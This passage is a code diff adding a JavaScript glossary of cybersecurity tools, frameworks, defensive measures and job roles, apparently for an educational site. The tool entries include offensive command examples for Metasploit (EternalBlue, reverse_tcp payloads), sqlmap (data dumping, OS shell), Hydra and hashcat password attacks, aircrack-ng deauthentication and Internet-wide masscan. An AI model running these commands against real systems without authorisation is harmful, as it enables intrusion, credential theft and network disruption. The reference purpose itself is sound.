+                    'Exploit execution: <code>use exploit/windows/smb/ms17_010_eternalblue</code>',
+                    'Payload generation: <code>msfvenom -p windows/meterpreter/reverse_tcp</code>',
+                    'Post-exploitation: Meterpreter for system control and data gathering',
+                    'Auxiliary modules: Port scanning, fuzzing, and service enumeration',
+                    'Automated exploitation: <code>db_autopwn</code> for mass exploitation'
+                ],
+                usage: 'Penetration testing, exploit development, vulnerability validation, red team operations, and security research.'
+            },
+            'ST': {
+                name: 'Snort',
+                category: 'tool',
+                categoryName: 'Security Tool',
+                definition: 'Open-source network intrusion detection and prevention system (IDS/IPS) that performs real-time traffic analysis and packet logging using signature-based detection.',
+                examples: [
+                    'IDS mode: Passive monitoring and alerting on suspicious traffic',
+                    'IPS mode: Active blocking of detected threats',
+                    'Custom rules: <code>alert tcp any any -> 192.168.1.0/24 80</code>',
+                    'Protocol analysis: Deep packet inspection for anomalies',
+                    'Integration: Works with Snorby, BASE, Barnyard2 for visualization'
+                ],
+                usage: 'Network security monitoring, threat detection, compliance monitoring, and research on attack patterns and malware behavior.'
+            },
+            'WS': {
+                name: 'Wireshark',
+                category: 'tool',
+                categoryName: 'Security Tool',
+                definition: 'Network protocol analyzer that captures and displays packet data in real-time, allowing detailed inspection of network traffic for troubleshooting and security analysis.',
+                examples: [
+                    'Packet capture: Live capturing from network interfaces',
+                    'Protocol dissection: Detailed breakdown of protocol layers',
+                    'Display filters: <code>http.request.method == "POST"</code>',
+                    'Following streams: Reconstructing TCP conversations',
+                    'Decryption: SSL/TLS decryption with private keys'
+                ],
+                usage: 'Network troubleshooting, security analysis, protocol development, forensic investigations, and educational purposes for understanding network protocols.'
+            },
+            'NK': {
+                name: 'Nikto',
+                category: 'tool',
+                categoryName: 'Security Tool',
+                definition: 'Open-source web server scanner that performs comprehensive tests against web servers for multiple items including dangerous files, outdated versions, and configuration issues.',
+                examples: [
+                    'Basic scan: <code>nikto -h http://target.com</code>',
+                    'SSL scan: <code>nikto -h https://target.com -ssl</code>',
+                    'Specific tests: <code>nikto -h target.com -Tuning 9</code> (SQL injection)',
+                    'Output formats: Save results in HTML, XML, CSV formats',
+                    'Plugin usage: Extensible through plugin architecture'
+                ],
+                usage: 'Web server security assessment, compliance auditing, identifying misconfigurations, and pre-deployment security checks.'
+            },
+            'HC': {
+                name: 'Hashcat',
+                category: 'tool',
+                categoryName: 'Security Tool',
+                definition: 'Advanced password recovery tool supporting GPU acceleration, capable of cracking various hash types using dictionary, brute-force, combinator, and rule-based attacks.',
+                examples: [
+                    'Dictionary attack: <code>hashcat -m 0 -a 0 hashes.txt wordlist.txt</code>',
+                    'Brute force: <code>hashcat -m 0 -a 3 hashes.txt ?a?a?a?a?a?a</code>',
+                    'Mask attack: <code>hashcat -m 0 hash.txt -a 3 ?d?d?d?d?d?d?d?d</code>',
+                    'Combination: <code>hashcat -m 0 -a 1 wordlist1.txt wordlist2.txt</code>',
+                    'GPU acceleration: Utilizing multiple GPUs for faster cracking'
+                ],
+                usage: 'Password auditing, forensics, recovering encrypted data, testing password policies, and security research on hash algorithms.'
+            },
+            'SQ': {
+                name: 'SQLmap',
+                category: 'tool',
+                categoryName: 'Security Tool',
+                definition: 'Automated tool for detecting and exploiting SQL injection vulnerabilities, supporting various database management systems and injection techniques.',
+                examples: [
+                    'Basic scan: <code>sqlmap -u "http://target.com/page?id=1"</code>',
+                    'Database enumeration: <code>sqlmap -u "url" --dbs</code>',
+                    'Data extraction: <code>sqlmap -u "url" -D database -T table --dump</code>',
+                    'OS shell: <code>sqlmap -u "url" --os-shell</code>',
+                    'POST parameters: <code>sqlmap -u "url" --data="param=value"</code>'
+                ],
+                usage: 'Web application security testing, database security audits, penetration testing, and demonstrating SQL injection risks.'
+            },
+            'KX': {
+                name: 'Kali Linux',
+                category: 'tool',
+                categoryName: 'Security Tool',
+                definition: 'Debian-based Linux distribution specifically designed for penetration testing and security auditing, pre-loaded with hundreds of security tools.',
+                examples: [
+                    '600+ tools: Nmap, Metasploit, Burp Suite, Wireshark, and more',
+                    'Live boot: Run from USB without installation',
+                    'ARM support: Works on Raspberry Pi and other ARM devices',
+                    'Cloud images: Available for AWS, Azure, and other platforms',
+                    'Customization: Create custom ISO with needed tools'
+                ],
+                usage: 'Penetration testing, digital forensics, reverse engineering, security research, and training environments for cybersecurity professionals.'
+            },
+            'MS': {
+                name: 'Masscan',
+                category: 'tool',
+                categoryName: 'Security Tool',
+                definition: 'Ultra-fast port scanner capable of scanning the entire Internet in under 6 minutes, transmitting 10 million packets per second with asynchronous transmission.',
+                examples: [
+                    'Fast scan: <code>masscan 0.0.0.0/0 -p80</code>',
+                    'Multiple ports: <code>masscan 192.168.1.0/24 -p22,80,443</code>',
+                    'Rate limiting: <code>masscan target -p80 --rate 10000</code>',
+                    'Banner grabbing: <code>masscan target -p80 --banners</code>',
+                    'Output: Save results in various formats for further analysis'
+                ],
+                usage: 'Large-scale network reconnaissance, security assessments of large IP ranges, and discovering exposed services across networks.'
+            },
+            'HD': {
+                name: 'Hydra',
+                category: 'tool',
+                categoryName: 'Security Tool',
+                definition: 'Fast and flexible password cracking tool supporting numerous protocols including SSH, FTP, HTTP, SMB, and many more for online password attacks.',
+                examples: [
+                    'SSH attack: <code>hydra -l admin -P passwords.txt ssh://target</code>',
+                    'FTP brute force: <code>hydra -L users.txt -P pass.txt ftp://target</code>',
+                    'HTTP POST: <code>hydra -l admin -P pass.txt target http-post-form</code>',
+                    'Multiple targets: Attack multiple hosts simultaneously',
+                    'Protocol support: 50+ protocols including RDP, MySQL, PostgreSQL'
+                ],
+                usage: 'Password auditing, testing authentication security, penetration testing, and validating password policies across various services.'
+            },
+            'AG': {
+                name: 'Aircrack-ng',
+                category: 'tool',
+                categoryName: 'Security Tool',
+                definition: 'Complete suite of tools to assess WiFi network security, including packet capture, analysis, attack execution, and password cracking for wireless networks.',
+                examples: [
+                    'Monitor mode: <code>airmon-ng start wlan0</code>',
+                    'Capture handshake: <code>airodump-ng -c 6 --bssid XX:XX:XX wlan0mon</code>',
+                    'Deauth attack: <code>aireplay-ng --deauth 10 -a XX:XX:XX wlan0mon</code>',
+                    'Crack WPA: <code>aircrack-ng -w wordlist.txt capture.cap</code>',
+                    'WEP cracking: Capturing IVs and statistical cracking'
+                ],
+                usage: 'Wireless security auditing, WiFi penetration testing, assessing WPA/WEP security, and educational purposes for wireless security.'
+            },
+            'GR': {
+                name: 'Greenbone (OpenVAS)',
+                category: 'tool',
+                categoryName: 'Security Tool',
+                definition: 'Comprehensive open-source vulnerability scanner and management solution, providing automated security testing with thousands of network vulnerability tests.',
+                examples: [
+                    'Full scan: Comprehensive vulnerability assessment',
+                    'Authenticated scans: Credentialed testing for deeper analysis',
+                    'Compliance audits: PCI-DSS, HIPAA compliance checking',
+                    'Scheduled scans: Automated recurring vulnerability assessments',
+                    'Report generation: Detailed reports in multiple formats'
+                ],
+                usage: 'Vulnerability management, compliance auditing, continuous security monitoring, and maintaining security posture through regular scanning.'
+            },
+            'TD': {
+                name: 'Tripwire',
+                category: 'tool',
+                categoryName: 'Security Tool',
+                definition: 'File integrity monitoring tool that creates baseline of system files and alerts on any unauthorized changes, helping detect intrusions and maintain system integrity.',
+                examples: [
+                    'Baseline creation: Initial snapshot of file system state',
+                    'Change detection: Alert on modifications to critical files',
+                    'Policy-based monitoring: Define what files/directories to monitor',
+                    'Compliance reporting: Support for various compliance requirements',
+                    'Integrity verification: Cryptographic hashes for change validation'
+                ],
+                usage: 'Intrusion detection, compliance monitoring (PCI-DSS, HIPAA), change management, and maintaining system integrity in production environments.'
+            },
+            
+            // FRAMEWORKS & STANDARDS
+            'ME': {
+                name: 'MITRE ATT&CK',
+                category: 'framework',
+                categoryName: 'Framework',
+                definition: 'A globally-accessible knowledge base of adversary tactics and techniques based on real-world observations, used as a foundation for threat models and methodologies.',
+                examples: [
+                    'Tactics: Initial Access, Execution, Persistence, Privilege Escalation',
+                    'Techniques: T1566 (Phishing), T1078 (Valid Accounts)',
+                    'Matrices: Enterprise, Mobile, ICS/OT specific frameworks',
+                    'APT mapping: Understanding threat actor behaviors and TTPs',
+                    'Detection: Building detection rules based on ATT&CK techniques'
+                ],
+                usage: 'Threat intelligence, red team planning, purple team exercises, security tool evaluation, and improving detection and response capabilities.'
+            },
+            'IS': {
+                name: 'ISO/IEC 27001',
+                category: 'framework',
+                categoryName: 'Framework',
+                definition: 'International standard for information security management systems (ISMS), providing requirements for establishing, implementing, maintaining and continually improving security.',
+                examples: [
+                    'ISMS framework: Systematic approach to managing sensitive information',
+                    'Risk assessment: Identifying and treating information security risks',
+                    'Controls: 114 security controls across 14 domains',
+                    'Certification: Third-party audit for ISO 27001 certification',
+                    'Continuous improvement: PDCA cycle for ongoing enhancement'
+                ],
+                usage: 'Establishing information security programs, achieving compliance, demonstrating security commitment to clients, and managing security risks systematically.'
+            },
+            'OW': {
+                name: 'OWASP Top 10',
+                category: 'framework',
+                categoryName: 'Framework',
+                definition: 'Standard awareness document representing a broad consensus about the most critical security risks to web applications, updated periodically based on vulnerability data.',
+                examples: [
+                    'A01:2021 - Broken Access Control',
+                    'A02:2021 - Cryptographic Failures',
+                    'A03:2021 - Injection (SQL, NoSQL, Command)',
+                    'A04:2021 - Insecure Design',
+                    'A05:2021 - Security Misconfiguration'
+                ],
+                usage: 'Web application security testing, developer training, security requirements definition, and prioritizing security investments for web applications.'
+            },
+            'NC': {
+                name: 'NIST Cybersecurity Framework',
+                category: 'framework',
+                categoryName: 'Framework',
+                definition: 'Policy framework of computer security guidance for how private sector organizations can assess and improve their ability to prevent, detect, and respond to cyber attacks.',
+                examples: [
+                    'Identify: Asset management, risk assessment, governance',
+                    'Protect: Access control, awareness training, data security',
+                    'Detect: Anomalies detection, continuous monitoring',
+                    'Respond: Response planning, communications, analysis',
+                    'Recover: Recovery planning, improvements, communications'
+                ],
+                usage: 'Enterprise security program development, risk management, regulatory compliance, and aligning security with business objectives.'
+            },
+            'CT': {
+                name: 'COBIT',
+                category: 'framework',
+                categoryName: 'Framework',
+                definition: 'Control Objectives for Information and Related Technologies - Framework for IT governance and management, helping enterprises create optimal value from IT.',
+                examples: [
+                    'Governance objectives: Stakeholder needs satisfaction',
+                    'Management objectives: Build, Acquire, Implement (BAI)',
+                    'Process reference model: 40 governance and management processes',
+                    'Performance management: Goals and metrics for IT processes',
+                    'IT risk optimization: Balancing benefits and resources'
+                ],
+                usage: 'IT governance, audit and compliance, enterprise risk management, and aligning IT strategy with business goals.'
+            },
+            'PS': {
+                name: 'PCI DSS',
+                category: 'framework',
+                categoryName: 'Framework',
+                definition: 'Payment Card Industry Data Security Standard - Set of security requirements designed to ensure that companies processing credit card data maintain a secure environment.',
+                examples: [
+                    'Requirement 1: Install and maintain firewall configuration',
+                    'Requirement 3: Protect stored cardholder data',
+                    'Requirement 8: Identify and authenticate access',
+                    'Requirement 10: Track and monitor network access',
+                    'Requirement 11: Regularly test security systems'
+                ],
+                usage: 'Payment processing compliance, protecting cardholder data, e-commerce security, and maintaining merchant accounts with card processors.'
+            },
+            'S2': {
+                name: 'SOC 2',
+                category: 'framework',
+                categoryName: 'Framework',
+                definition: 'Service Organization Control 2 - Auditing procedure ensuring service providers securely manage data to protect client interests and privacy, based on Trust Services Criteria.',
+                examples: [
+                    'Security: Protection against unauthorized access',
+                    'Availability: System is available for operation and use',
+                    'Processing Integrity: System processing is complete and accurate',
+                    'Confidentiality: Confidential information is protected',
+                    'Privacy: Personal information is properly collected and protected'
+                ],
+                usage: 'Cloud service provider audits, SaaS security validation, vendor risk assessments, and demonstrating security controls to enterprise customers.'
+            },
+            'HP': {
+                name: 'HIPAA',
+                category: 'framework',
+                categoryName: 'Framework',
+                definition: 'Health Insurance Portability and Accountability Act - US legislation providing data privacy and security provisions for safeguarding medical information (PHI).',
+                examples: [
+                    'Privacy Rule: Standards for protecting health information',
+                    'Security Rule: Administrative, physical, and technical safeguards',
+                    'Breach Notification Rule: Requirements for breach reporting',
+                    'Access controls: Unique user IDs, emergency access procedures',
+                    'Audit controls: Hardware, software, and procedural mechanisms'
+                ],
+                usage: 'Healthcare security compliance, protecting patient data, medical device security, and health information exchange security.'
+            },
+            'GD': {
+                name: 'GDPR',
+                category: 'framework',
+                categoryName: 'Framework',
+                definition: 'General Data Protection Regulation - EU regulation on data protection and privacy, requiring organizations to protect EU citizens\' personal data and privacy.',
+                examples: [
+                    'Lawful basis: Consent, contract, legal obligation for processing',
+                    'Data subject rights: Right to access, erasure, portability',
+                    'Privacy by design: Data protection integrated into development',
+                    'Breach notification: 72-hour reporting requirement',
+                    'DPO requirement: Data Protection Officer for certain organizations'
+                ],
+                usage: 'EU data protection compliance, privacy program development, managing data subject requests, and avoiding substantial fines for non-compliance.'
+            },
+            'ZT': {
+                name: 'Zero Trust',
+                category: 'framework',
+                categoryName: 'Framework',
+                definition: 'Security model that requires strict identity verification for every person and device attempting to access resources, regardless of whether they are inside or outside the network perimeter.',
+                examples: [
+                    'Never trust, always verify: Continuous authentication and authorization',
+                    'Least privilege access: Minimum necessary permissions',
+                    'Micro-segmentation: Dividing networks into small zones',
+                    'Multi-factor authentication: Required for all access',
+                    'Assume breach: Design with compromise in mind'
+                ],
+                usage: 'Modern security architecture, cloud security, remote work security, and reducing attack surface through network segmentation.'
+            },
+            'CC': {
+                name: 'CIS Controls',
+                category: 'framework',
+                categoryName: 'Framework',
+                definition: 'Center for Internet Security Critical Security Controls - Prioritized set of actions to protect organizations from known cyber attack vectors, organized by implementation groups.',
+                examples: [
+                    'IG1: Basic cyber hygiene (inventory, secure config)',
+                    'IG2: Helps security teams manage sensitive data (data protection)',
+                    'IG3: Mitigate sophisticated attacks (penetration testing)',
+                    'Control 1: Inventory and Control of Enterprise Assets',
+                    'Control 5: Account Management'
+                ],
+                usage: 'Security program development, prioritizing security investments, cyber insurance requirements, and establishing baseline security controls.'
+            },
+            'KC': {
+                name: 'Cyber Kill Chain',
+                category: 'framework',
+                categoryName: 'Framework',
+                definition: 'Framework developed by Lockheed Martin describing the stages of a cyber attack from reconnaissance to actions on objectives, helping defenders understand and interrupt attacks.',
+                examples: [
+                    'Reconnaissance: Harvesting email addresses, identifying targets',
+                    'Weaponization: Creating malicious payload (malware + exploit)',
+                    'Delivery: Transmitting weapon to victim (email, USB, website)',
+                    'Exploitation: Triggering vulnerability to execute code',
+                    'Installation: Installing backdoor/persistent access',
+                    'Command & Control: Establishing C2 channel',
+                    'Actions on Objectives: Data exfiltration, destruction'
+                ],
+                usage: 'Threat modeling, incident response planning, security architecture design, and understanding adversary progression through attack phases.'
+            },
+            
+            // CONCEPTS & OPERATIONS
+            'TI': {
+                name: 'Threat Intelligence',
+                category: 'concept',
+                categoryName: 'Concept',
+                definition: 'Evidence-based knowledge about existing or emerging threats, including context, indicators, implications, and actionable advice to help make informed security decisions.',
+                examples: [
+                    'Strategic: High-level threat landscape for executives',
+                    'Tactical: TTPs (Tactics, Techniques, Procedures) of attackers',
+                    'Operational: Information about ongoing attacks and campaigns',
+                    'Technical: IOCs (Indicators of Compromise) - IPs, domains, hashes',
+                    'Sources: OSINT, commercial feeds, ISACs, dark web monitoring'
+                ],
+                usage: 'Proactive threat hunting, security tool tuning, incident response, risk assessment, and informing security strategy and investments.'
+            },
+            
+            // DEFENSIVE MEASURES
+            'SB': {
+                name: 'Sandboxing',
+                category: 'defensive',
+                categoryName: 'Defensive Measure',
+                definition: 'Security mechanism for isolating running programs, typically used to execute untested code or untrusted programs from unverified sources in a controlled environment.',
+                examples: [
+                    'File detonation: Execute suspicious files in isolated environment',
+                    'Browser sandboxing: Chrome tabs run in separate processes',
+                    'Application sandboxing: iOS/Android app isolation',
+                    'Virtual machines: Analyzing malware in VMs',
+                    'Container isolation: Docker for application isolation'
+                ],
+                usage: 'Malware analysis, testing suspicious files, browser security, mobile app security, and protecting production systems from untrusted code.'
+            },
+            'EP': {
+                name: 'Encryption',
+                category: 'defensive',
+                categoryName: 'Defensive Measure',
+                definition: 'Process of encoding information in such a way that only authorized parties can access it, converting plaintext into ciphertext using mathematical algorithms and keys.',
+                examples: [
+                    'At rest: Full disk encryption (BitLocker, FileVault)',
+                    'In transit: TLS/SSL for web traffic, VPN tunnels',
+                    'Symmetric: AES-256 for file and disk encryption',
+                    'Asymmetric: RSA, ECC for key exchange and digital signatures',
+                    'End-to-end: Signal, WhatsApp encrypted messaging'
+                ],
+                usage: 'Protecting sensitive data, securing communications, compliance requirements, preventing data breaches, and maintaining confidentiality.'
+            },
+            'FL': {
+                name: 'Firewall',
+                category: 'defensive',
+                categoryName: 'Defensive Measure',
+                definition: 'Network security device that monitors and controls incoming and outgoing traffic based on predetermined security rules, acting as a barrier between trusted and untrusted networks.',
+                examples: [
+                    'Network firewall: Filtering traffic between network segments',
+                    'Application firewall: WAF protecting web applications',
+                    'Next-gen firewall: Deep packet inspection, IPS integration',
+                    'Host-based firewall: Windows Firewall, iptables',
+                    'Cloud firewall: AWS Security Groups, Azure Firewall'
+                ],
+                usage: 'Network perimeter security, access control, threat prevention, network segmentation, and meeting compliance requirements.'
+            },
+            'SE': {
+                name: 'Security Monitoring',
+                category: 'defensive',
+                categoryName: 'Defensive Measure',
+                definition: 'Continuous observation of IT environment to detect security incidents, policy violations, and anomalous behavior through log analysis and real-time alerting.',
+                examples: [
+                    'Log aggregation: Centralizing logs from all sources',
+                    'SIEM: Splunk, QRadar analyzing security events',
+                    'Real-time alerting: Immediate notification of suspicious activity',
+                    'User behavior analytics: Detecting anomalous user actions',
+                    'Network monitoring: Analyzing traffic patterns for threats'
+                ],
+                usage: 'Threat detection, incident response, compliance reporting, forensic investigations, and maintaining security visibility.'
+            },
+            'VP': {
+                name: 'Virtual Private Network (VPN)',
+                category: 'defensive',
+                categoryName: 'Defensive Measure',
+                definition: 'Technology that creates a secure, encrypted connection over a less secure network (like the Internet), extending a private network across a public network.',
+                examples: [
+                    'Remote access VPN: Employees connecting to corporate network',
+                    'Site-to-site VPN: Connecting branch offices to headquarters',
+                    'SSL VPN: Browser-based secure access',
+                    'IPsec VPN: Network layer encryption and authentication',
+                    'Split tunneling: Selective traffic routing through VPN'
+                ],
+                usage: 'Secure remote access, protecting public WiFi usage, bypassing geographical restrictions, and encrypting internet traffic for privacy.'
+            },
+            'VA': {
+                name: 'Vulnerability Assessment',
+                category: 'defensive',
+                categoryName: 'Defensive Measure',
+                definition: 'Systematic review of security weaknesses in an information system, identifying, quantifying, and prioritizing vulnerabilities for remediation.',
+                examples: [
+                    'Network scanning: Nessus, Qualys identifying system vulnerabilities',
+                    'Web app scanning: OWASP ZAP, Acunetix for web vulnerabilities',
+                    'Authenticated scanning: Credentialed scans for deeper analysis',
+                    'Risk scoring: CVSS ratings prioritizing remediation efforts',
+                    'Continuous assessment: Automated regular vulnerability scanning'
+                ],
+                usage: 'Proactive security, patch management prioritization, compliance requirements, reducing attack surface, and security posture improvement.'
+            },
+            'AC': {
+                name: 'Access Control',
+                category: 'defensive',
+                categoryName: 'Defensive Measure',
+                definition: 'Security technique that regulates who or what can view or use resources in a computing environment, implementing authentication and authorization mechanisms.',
+                examples: [
+                    'Role-based (RBAC): Access based on job function',
+                    'Attribute-based (ABAC): Access based on user attributes',
+                    'Mandatory (MAC): System-enforced access policies',
+                    'Discretionary (DAC): Owner controls access permissions',
+                    'Least privilege: Minimum necessary access rights'
+                ],
+                usage: 'Protecting sensitive resources, compliance requirements, preventing unauthorized access, and implementing security policies consistently.'
+            },
+            'Ed': {
+                name: 'Endpoint Detection & Response',
+                category: 'defensive',
+                categoryName: 'Defensive Measure',
+                definition: 'Integrated endpoint security solution combining real-time monitoring and data collection with automated response capabilities to detect and remediate threats on endpoints.',
+                examples: [
+                    'Behavioral analysis: Detecting anomalous process behavior',
+                    'Threat hunting: Proactive searching for threats',
+                    'Automated response: Quarantine infected devices automatically',
+                    'Forensics: Detailed endpoint activity investigation',
+                    'Popular solutions: CrowdStrike, Carbon Black, SentinelOne'
+                ],
+                usage: 'Advanced threat protection, incident response, threat hunting, forensic investigations, and replacing traditional antivirus.'
+            },
+            'SU': {
+                name: 'Security Awareness Training',
+                category: 'defensive',
+                categoryName: 'Defensive Measure',
+                definition: 'Educational programs designed to help users understand security risks, recognize threats, and follow security best practices to protect organizational assets.',
+                examples: [
+                    'Phishing simulations: Testing users with fake phishing emails',
+                    'Security policies: Educating on password policies, data handling',
+                    'Social engineering awareness: Recognizing manipulation tactics',
+                    'Compliance training: HIPAA, PCI-DSS requirements',
+                    'Incident reporting: How to report suspicious activity'
+                ],
+                usage: 'Reducing human error, compliance requirements, creating security culture, improving incident reporting, and strengthening security posture.'
+            },
+            'RA': {
+                name: 'Risk Assessment',
+                category: 'defensive',
+                categoryName: 'Defensive Measure',
+                definition: 'Process of identifying, analyzing, and evaluating risk to organizational assets, operations, and individuals to determine appropriate risk mitigation strategies.',
+                examples: [
+                    'Asset identification: Cataloging critical systems and data',
+                    'Threat identification: Determining potential threat sources',
+                    'Vulnerability analysis: Identifying security weaknesses',
+                    'Impact analysis: Assessing potential damage from threats',
+                    'Risk prioritization: Using risk matrix to prioritize remediation'
+                ],
+                usage: 'Security program planning, budget justification, compliance requirements, insurance requirements, and informed decision-making.'
+            },
+            'SM': {
+                name: 'Security Information & Event Management',
+                category: 'defensive',
+                categoryName: 'Defensive Measure',
+                definition: 'Technology that provides real-time analysis of security alerts generated by network hardware and applications, combining security information management with security event management.',
+                examples: [
+                    'Log aggregation: Collecting logs from all IT infrastructure',
+                    'Correlation rules: Detecting attack patterns across events',
+                    'Dashboards: Real-time security posture visualization',
+                    'Compliance reporting: Automated audit trail generation',
+                    'Popular platforms: Splunk, IBM QRadar, ArcSight, LogRhythm'
+                ],
+                usage: 'Threat detection, incident response, compliance reporting, forensic investigation, and maintaining security visibility across enterprise.'
+            },
+            'PM': {
+                name: 'Patch Management',
+                category: 'defensive',
+                categoryName: 'Defensive Measure',
+                definition: 'Process of identifying, acquiring, installing, and verifying patches for products and systems to fix vulnerabilities and improve security.',
+                examples: [
+                    'Automated patching: WSUS, SCCM for Windows updates',
+                    'Vulnerability prioritization: Critical patches applied first',
+                    'Testing: Validating patches in test environment',
+                    'Emergency patching: Rapid response to zero-day vulnerabilities',
+                    'Third-party patching: Managing Adobe, Java, browser updates'
+                ],
+                usage: 'Reducing attack surface, compliance requirements, preventing known exploits, maintaining system stability, and security hygiene.'
+            },
+            'IR': {
+                name: 'Incident Response',
+                category: 'defensive',
+                categoryName: 'Defensive Measure',
+                definition: 'Organized approach to addressing and managing the aftermath of a security breach or cyber attack, minimizing damage and reducing recovery time and costs.',
+                examples: [
+                    'Preparation: IR plan, tools, and trained team',
+                    'Detection: Identifying security incidents',
+                    'Containment: Isolating affected systems to prevent spread',
+                    'Eradication: Removing threat from environment',
+                    'Recovery: Restoring systems to normal operations',
+                    'Lessons learned: Post-incident analysis and improvement'
+                ],
+                usage: 'Handling security breaches, minimizing damage, meeting compliance requirements, preserving evidence, and improving security posture.'
+            },
+            'MA': {
+                name: 'Multi-Factor Authentication',
+                category: 'defensive',
+                categoryName: 'Defensive Measure',
+                definition: 'Authentication method requiring two or more verification factors to gain access, combining something you know (password), have (token), and/or are (biometric).',
+                examples: [
+                    'SMS codes: One-time passwords sent via text',
+                    'Authenticator apps: Google Authenticator, Authy generating TOTP',
+                    'Hardware tokens: YubiKey, RSA SecurID',
+                    'Biometrics: Fingerprint, facial recognition',
+                    'Push notifications: Duo Mobile, Microsoft Authenticator'
+                ],
+                usage: 'Preventing credential theft, protecting sensitive accounts, compliance requirements, securing remote access, and reducing account compromise.'
+            },
+            'AR': {
+                name: 'Attack Surface Reduction',
+                category: 'defensive',
+                categoryName: 'Defensive Measure',
+                definition: 'Security strategy focused on minimizing the number of points where an attacker can try to enter or extract data from an environment.',
+                examples: [
+                    'Disabling services: Removing unnecessary running services',
+                    'Port closure: Blocking unused network ports',
+                    'Application whitelisting: Only approved software can run',
+                    'Least privilege: Removing excessive permissions',
+                    'Network segmentation: Limiting lateral movement'
+                ],
+                usage: 'Reducing risk exposure, simplifying security management, meeting security benchmarks, and preventing potential attack vectors.'
+            },
+            'SP': {
+                name: 'Security Posture',
+                category: 'defensive',
+                categoryName: 'Defensive Measure',
+                definition: 'Overall cybersecurity strength and readiness of an organization, encompassing the state of assets, defenses, and ability to detect and respond to threats.',
+                examples: [
+                    'Maturity assessment: Evaluating security program maturity',
+                    'Gap analysis: Identifying security control deficiencies',
+                    'Metrics tracking: KPIs for security effectiveness',
+                    'Continuous improvement: Regular posture enhancement',
+                    'Benchmarking: Comparing against industry standards'
+                ],
+                usage: 'Strategic security planning, board reporting, insurance assessments, vendor risk management, and continuous security improvement.'
+            },
+            'DL': {
+                name: 'Data Loss Prevention',
+                category: 'defensive',
+                categoryName: 'Defensive Measure',
+                definition: 'Strategy and tools to ensure sensitive or critical information is not sent outside the corporate network, preventing data leaks and unauthorized data exfiltration.',
+                examples: [
+                    'Content inspection: Scanning outbound data for sensitive patterns',
+                    'Email DLP: Blocking emails containing credit cards, SSNs',
+                    'Endpoint DLP: Preventing USB drive data copying',
+                    'Cloud DLP: Monitoring data in SaaS applications',
+                    'Network DLP: Inspecting traffic for data exfiltration'
+                ],
+                usage: 'Protecting intellectual property, compliance requirements (GDPR, HIPAA), preventing insider threats, and securing sensitive data.'
+            },
+            
+            // ROLES
+            'PT': {
+                name: 'Penetration Tester',
+                category: 'role',
+                categoryName: 'Security Role',
+                definition: 'Security professional who simulates cyber attacks on systems, networks, and applications to identify vulnerabilities before malicious actors can exploit them.',
+                examples: [
+                    'Web app testing: Finding OWASP Top 10 vulnerabilities',
+                    'Network penetration: Testing perimeter and internal security',
+                    'Social engineering: Phishing campaigns and physical security',
+                    'Wireless testing: Attacking WiFi networks and protocols',
+                    'Mobile app testing: iOS and Android security assessment'
+                ],
+                certifications: 'OSCP, CEH, GPEN, GWAPT, CRTP',
+                skills: 'Scripting (Python, Bash), networking, web technologies, Metasploit, Burp Suite, manual exploitation techniques'
+            },
+            'SA': {
+                name: 'Security Analyst',
+                category: 'role',
+                categoryName: 'Security Role',
+                definition: 'Professional who protects organization\'s information systems by monitoring, detecting, investigating, analyzing, and responding to security events.',
+                examples: [
+                    'Log analysis: Reviewing SIEM alerts for security incidents',
+                    'Threat detection: Identifying malicious activity in networks',
+                    'Vulnerability management: Coordinating patch deployment',
+                    'Security assessments: Evaluating security controls',
+                    'Policy compliance: Ensuring adherence to security policies'
+                ],
+                certifications: 'Security+, CySA+, GCIA, GCIH',
+                skills: 'Log analysis, incident response, SIEM platforms, network protocols, threat intelligence, security tools'
+            },
+            'SO': {
+                name: 'SOC Analyst',
+                category: 'role',
+                categoryName: 'Security Role',
+                definition: 'Security Operations Center analyst who monitors organization\'s security posture 24/7, investigating security alerts and responding to incidents in real-time.',
+                examples: [
+                    'Alert triage: Prioritizing and investigating SIEM alerts',
+                    'Tier 1: Initial investigation and escalation',
+                    'Tier 2: Deep dive analysis and containment',
+                    'Tier 3: Advanced threat hunting and architecture',
+                    'Shift work: 24/7 monitoring rotation'
+                ],
+                certifications: 'Security+, CySA+, GCIA, BTL1',
+                skills: 'SIEM platforms, log analysis, incident response, network traffic analysis, malware analysis, ticketing systems'
+            },
+            'TH': {
+                name: 'Threat Hunter',
+                category: 'role',
+                categoryName: 'Security Role',
+                definition: 'Proactive security professional who searches through networks and datasets to detect and isolate advanced threats that evade existing security solutions.',
+                examples: [
+                    'Hypothesis-driven hunting: Searching for specific TTPs',
+                    'IOC hunting: Looking for indicators of compromise',
+                    'Behavioral analysis: Detecting anomalous activities',
+                    'Threat intelligence: Applying threat intel to hunting',
+                    'Tool development: Creating custom hunting tools and queries'
+                ],
+                certifications: 'GCIH, GCFA, BTL2, Certified Threat Intelligence Analyst',
+                skills: 'Threat intelligence, SIEM, EDR platforms, scripting, MITRE ATT&CK, network forensics, malware analysis'
+            },
+            'RT': {
+                name: 'Red Teamer',
+                category: 'role',
+                categoryName: 'Security Role',
+                definition: 'Offensive security professional who simulates advanced persistent threats using adversarial tactics to test organization\'s detection and response capabilities.',
+                examples: [
+                    'Full-scope engagements: Multi-phase attack simulations',
+                    'Purple team exercises: Working with defenders to improve',
+                    'Infrastructure setup: Building attack infrastructure (C2 servers)',
+                    'Custom tooling: Developing evasive attack tools',
+                    'Physical security: Bypassing physical access controls'
+                ],
+                certifications: 'OSCP, OSCE, CRTO, PNPT, Red Team Ops',
+                skills: 'Advanced exploitation, Active Directory attacks, evasion techniques, C2 frameworks (Cobalt Strike, Metasploit), social engineering'
+            },
+            'BT': {
+                name: 'Blue Teamer',
+                category: 'role',
+                categoryName: 'Security Role',
+                definition: 'Defensive security professional focused on protecting systems by implementing security controls, monitoring for threats, and responding to attacks.',
+                examples: [
+                    'Defense implementation: Hardening systems and networks',
+                    'Detection engineering: Creating detection rules and alerts',
+                    'Incident response: Containing and remediating breaches',
+                    'Threat analysis: Understanding adversary techniques',
+                    'Security architecture: Designing secure infrastructures'
+                ],
+                certifications: 'GCIH, GCIA, GCED, BTL1, Security+',
+                skills: 'Incident response, log analysis, security controls, hardening, monitoring tools, defensive strategies, forensics'
+            },
+            'SY': {
+                name: 'System Administrator',
+                category: 'role',
+                categoryName: 'Security Role',
+                definition: 'IT professional responsible for managing, maintaining, and securing an organization\'s IT infrastructure including servers, networks, and workstations.',
+                examples: [
+                    'System maintenance: Patching, updates, and configurations',
+                    'User management: Creating accounts and managing permissions',
+                    'Backup management: Ensuring data is backed up and recoverable',
+                    'Security hardening: Implementing CIS benchmarks',
+                    'Monitoring: Tracking system health and performance'
+                ],
+                certifications: 'RHCSA, MCSA, Linux+, CompTIA Server+',
